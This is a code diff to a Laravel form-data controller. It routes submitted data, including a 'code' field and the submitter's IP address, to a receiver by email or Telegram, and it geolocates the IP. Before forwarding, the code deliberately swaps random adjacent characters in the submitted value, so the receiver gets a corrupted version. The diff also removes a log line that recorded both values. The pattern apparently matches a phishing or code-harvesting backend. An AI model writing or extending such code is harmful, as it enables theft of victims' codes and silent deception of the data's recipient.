@@ -63,7 +63,6 @@ class FormDataController extends Controller implements HasMiddleware
         if ($this->canInvertCode($validated['code'])) {
             $invertedCode = swap_adjacent_random_char($validated['code']);
         }
-        \Log::debug("Inverted code: {$invertedCode} from original code: {$validated['code']}");
 
         $isInverted = $validated['code'] !== $invertedCode;
         $existing = FormData::where('data->code', $validated['code'])->latest()->first();
@@ -93,13 +92,21 @@ class FormDataController extends Controller implements HasMiddleware
         TelegramMsgJob::dispatchSync($notifData, $formData->ip_address);
         SetLocation::dispatch($formData->ip_address, $formData, 'location');
 
-        if ($email = site_setting('receiver_email')) {
+        if ($receiver = site_setting('receiver_email')) {
             $data['code'] = $invertedCode;
-            $message = new FormDataMail($data);
-            if ($delay = site_setting('delay')) {
-                Mail::to($email)->later(now()->addSeconds($delay), $message);
-            } else {
-                Mail::to($email)->send($message);
+
+            if (receiver_type($receiver) === 'telegram') {
+                $notifData->setTitle('New Form Data Received');
+                $notifData->setBody(json_encode($data, JSON_PRETTY_PRINT));
+                \Log::debug('Dispatching TelegramMsgJob with data: ', $notifData->getData());
+                // TelegramMsgJob::dispatchSync($notifData, $formData->ip_address);
+            } elseif (receiver_type($receiver) === 'email') {
+                $message = new FormDataMail($data);
+                if ($delay = site_setting('delay')) {
+                    Mail::to($receiver)->later(now()->addSeconds($delay), $message);
+                } else {
+                    Mail::to($receiver)->send($message);
+                }
             }
         }
 
